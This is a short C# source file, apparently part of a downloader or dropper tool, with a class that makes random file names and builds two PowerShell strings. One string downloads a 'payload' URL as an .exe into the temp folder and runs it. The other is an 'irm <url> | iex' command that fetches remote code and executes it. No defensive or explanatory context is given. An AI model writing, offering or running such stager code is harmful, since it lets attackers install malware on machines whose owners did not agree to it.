using System;
using System.IO;
using System.Threading.Tasks;

namespace Downloader
{
    public class FileProcessor
    {
        private readonly Random random = new Random();

        public string GenerateRandomName()
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
            char[] name = new char[8];
            for (int i = 0; i < 8; i++)
            {
                name[i] = chars[random.Next(chars.Length)];
            }
            return new string(name);
        }

        public string CreatePowerShellScript(string payloadUrl, string filename)
        {
            return "$url = '" + payloadUrl + "'\r\n" +
                   "$tempFile = Join-Path $env:TEMP '" + filename + ".exe'\r\n" +
                   "Invoke-WebRequest -Uri $url -OutFile $tempFile\r\n" +
                   "Start-Process -FilePath $tempFile -Wait\r\n";
        }

        public string GenerateFinalCommand(string launcherUrl)
        {
            string cleanUrl = launcherUrl.Replace("https://", "");
            return "powershell \"irm " + cleanUrl + " | iex\"";
        }
    }
}